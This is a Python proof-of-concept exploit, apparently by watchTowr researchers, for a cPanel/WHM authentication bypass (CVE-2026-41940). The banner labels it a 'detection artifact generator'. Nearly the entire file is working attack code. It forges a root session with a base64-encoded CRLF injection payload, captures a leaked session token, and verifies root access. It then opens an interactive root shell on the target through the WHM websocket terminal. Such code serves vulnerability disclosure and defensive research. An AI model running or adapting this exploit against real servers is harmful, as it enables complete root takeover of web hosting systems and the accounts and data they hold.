import argparse
import base64
import json
import re
import sys
import urllib.parse
import requests
import urllib3
import threading

try:
    import websocket
except ImportError:
    print("[!] 'websocket-client' is required for the terminal. Please install it using 'pip install websocket-client'")
    sys.exit(1)

import ssl

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)


banner = """                     __         ___  ___________
         __  _  ______ _/  |__ ____ |  |_\\__    ____\\____  _  ________
         \\ \\/ \\/ \\__  \\    ___/ ___\\|  |  \\|    | /  _ \\ \\/ \\/ \\_  __ \\
          \\     / / __ \\|  | \\  \\___|   Y  |    |(  <_> \\     / |  | \\/
           \\/\\_/ (____  |__|  \\___  |___|__|__  | \\__  / \\/\\_/  |__|
                          \\/          \\/     \\/

        watchTowr-vs-cPanel-WHM-AuthBypass-to-RCE.py

        (*) cPanel/WHM Authentication Bypass - Detection Artifact Generator

          - Sina Kheirkhah (@SinSinology) of watchTowr (@watchTowrcyber)

        CVEs: [cve-2026-41940]
"""

print(banner)




# pre-built base64 of:
#   root:x\r\nsuccessful_internal_auth_with_timestamp=9999999999\r\nuser=root\r\ntfa_verified=1\r\nhasroot=1
PAYLOAD_B64 = (
    "cm9vdDp4DQpzdWNjZXNzZnVsX2ludGVybmFsX2F1dGhfd2l0aF90aW1lc3RhbXA9OTk5"
    "OTk5OTk5OQ0KdXNlcj1yb290DQp0ZmFfdmVyaWZpZWQ9MQ0KaGFzcm9vdD0x"
)


def parse_target(url):
    u = urllib.parse.urlsplit(url.rstrip("/"))
    return u.scheme, u.hostname, u.port or 2087


def discover_canonical_host(scheme, host, port):
    # cpsrvd 307s us to the right hostname when our Host header is wrong
    try:
        r = requests.get(
            f"{scheme}://{host}:{port}/openid_connect/cpanelid",
            verify=False,
            allow_redirects=False,
            headers={"Connection": "close"},
            timeout=10,
        )
    except Exception as e:
        print(f"[!] couldn't reach the target: {e}")
        sys.exit(1)
    loc = r.headers.get("Location", "")
    m = re.match(r"^https?://([^:/]+)", loc)
    if m:
        return m.group(1)
    return host


def make_session():
    s = requests.Session()
    s.verify = False
    return s


def http(s, method, scheme, host, port, canonical, path, **kw):
    # always send to the IP, but spoof Host so cpsrvd doesn't redirect us
    headers = kw.pop("headers", {})
    headers.setdefault("Host", f"{canonical}:{port}")
    headers.setdefault("Connection", "close")
    return s.request(
        method,
        f"{scheme}://{host}:{port}{path}",
        headers=headers,
        allow_redirects=False,
        **kw,
    )


def stage1_preauth(s, scheme, host, port, canonical):
    print("[1] minting a preauth session...")
    r = http(s, "POST", scheme, host, port, canonical,
             "/login/?login_only=1",
             data={"user": "root", "pass": "wrong"})

    # need to get the cookie from the raw header (requests url-decodes it)
    cookie_value = None
    for k, v in r.raw.headers.items():
        if k.lower() == "set-cookie" and v.startswith("whostmgrsession="):
            cookie_value = v.split("=", 1)[1].split(";", 1)[0]
            cookie_value = urllib.parse.unquote(cookie_value)
            break

    if not cookie_value:
        print("[!] /login didn't issue a whostmgrsession cookie")
        sys.exit(1)

    # strip the ",<obhex>" tail. that's what makes the encoder skip pass on stage 2.
    if "," in cookie_value:
        session_base = cookie_value.split(",", 1)[0]
    else:
        session_base = cookie_value

    print(f"    session base = {session_base}")
    return session_base


def stage2_inject(s, scheme, host, port, canonical, session_base):
    print("[2] sending the CRLF injection (Basic auth + no-ob cookie)...")
    cookie_enc = urllib.parse.quote(session_base)
    r = http(s, "GET", scheme, host, port, canonical, "/",
             headers={
                 "Authorization": f"Basic {PAYLOAD_B64}",
                 "Cookie": f"whostmgrsession={cookie_enc}",
             })

    # the 307 leaks the cp_security_token in the Location header
    loc = r.headers.get("Location", "")
    m = re.search(r"/cpsess\d{10}", loc)
    if not m:
        print(f"[!] no /cpsess token leaked (HTTP {r.status_code}). target may be patched.")
        sys.exit(1)
    token = m.group(0)
    print(f"    HTTP {r.status_code}, leaked token = {token}")
    return token


def stage3_propagate(s, scheme, host, port, canonical, session_base):
    print("[3] firing do_token_denied to propagate raw -> cache...")
    cookie_enc = urllib.parse.quote(session_base)
    r = http(s, "GET", scheme, host, port, canonical, "/scripts2/listaccts",
             headers={"Cookie": f"whostmgrsession={cookie_enc}"})

    body = r.text or ""
    if r.status_code == 401 and ("Token denied" in body or "WHM Login" in body):
        print(f"    HTTP {r.status_code}, gadget fired")
    else:
        print(f"[!] do_token_denied didn't fire as expected (HTTP {r.status_code})")
        sys.exit(1)


def stage4_verify(s, scheme, host, port, canonical, session_base, token):
    print("[4] verifying we're WHM root...")
    cookie_enc = urllib.parse.quote(session_base)
    r = http(s, "GET", scheme, host, port, canonical,
             f"{token}/json-api/version",
             headers={"Cookie": f"whostmgrsession={cookie_enc}"})

    body = (r.text or "").strip()
    print(f"    /json-api/version -> HTTP {r.status_code}  {body[:120]}")
    if r.status_code == 200 and '"version"' in body:
        return True
    if r.status_code in (500, 503) and "License" in body:
        # license-gated but we got past auth
        return True
    return False


def call_whm_api(s, scheme, host, port, canonical, session_base, token, function, params):
    cookie_enc = urllib.parse.quote(session_base)
    qs = "api.version=1"
    for k, v in params.items():
        if v is None:
            continue
        qs += f"&{urllib.parse.quote(k)}={urllib.parse.quote(str(v))}"
    path = f"{token}/json-api/{function}?{qs}"
    r = http(s, "GET", scheme, host, port, canonical, path,
             headers={"Cookie": f"whostmgrsession={cookie_enc}"})

    print(f"    {function} -> HTTP {r.status_code}")
    body = r.text or ""
    try:
        j = json.loads(body)
        print(json.dumps(j, indent=2)[:1500])
    except Exception:
        print(body[:1500])





def do_terminal(scheme, host, port, canonical, session_base, token):
    print(f"[*] Starting interactive websocket terminal at {token}/websocket/Shell...")
    cookie_enc = urllib.parse.quote(session_base)
    headers = [
        f"Cookie: whostmgrsession={cookie_enc}",
        f"Origin: {scheme}://{canonical}:{port}"
    ]
    ws_url = f"wss://{host}:{port}{token}/websocket/Shell?rows=24&cols=75"
    if scheme == "http":
        ws_url = f"ws://{host}:{port}{token}/websocket/Shell?rows=24&cols=75"
    
    ws = websocket.WebSocket(sslopt={"cert_reqs": ssl.CERT_NONE})
    try:
        ws.connect(ws_url, header=headers)
    except Exception as e:
        print(f"[!] Failed to connect to websocket: {e}")
        sys.exit(1)

    print("[+] Connected! You now have a root shell. Type 'exit' to quit.")

    def recv_thread():
        while True:
            try:
                msg = ws.recv()
                if not msg:
                    break
                if isinstance(msg, bytes):
                    sys.stdout.write(msg.decode('utf-8', errors='ignore'))
                else:
                    sys.stdout.write(msg)
                sys.stdout.flush()
            except Exception:
                break
        print("\n[!] Connection closed.")
        # force exit from the main thread
        import os
        os._exit(0)

    t = threading.Thread(target=recv_thread)
    t.daemon = True
    t.start()

    while True:
        try:
            cmd = sys.stdin.readline()
            if not cmd:
                break
            ws.send(cmd.replace('\n', '\r'))
        except KeyboardInterrupt:
            ws.send('\x03')  # Send Ctrl+C
        except Exception:
            break

parser = argparse.ArgumentParser()
parser.add_argument("--target", required=True, help="WHM URL, e.g. https://target:2087")
parser.add_argument("--hostname", default=None, help="override Host: header (auto-discovered if empty)")
args = parser.parse_args()




scheme, host, port = parse_target(args.target)
canonical = args.hostname or discover_canonical_host(scheme, host, port)
print(f"[0] hostname = {canonical}")

s = make_session()

session_base = stage1_preauth(s, scheme, host, port, canonical)
token = stage2_inject(s, scheme, host, port, canonical, session_base)
stage3_propagate(s, scheme, host, port, canonical, session_base)
if not stage4_verify(s, scheme, host, port, canonical, session_base, token):
    print("[!] auth bypass didn't land, not running the action")
    sys.exit(1)


#do_passwd(s, scheme, host, port, canonical, session_base, token, args.password)
do_terminal(scheme, host, port, canonical, session_base, token)

print(f"[+] Done.")
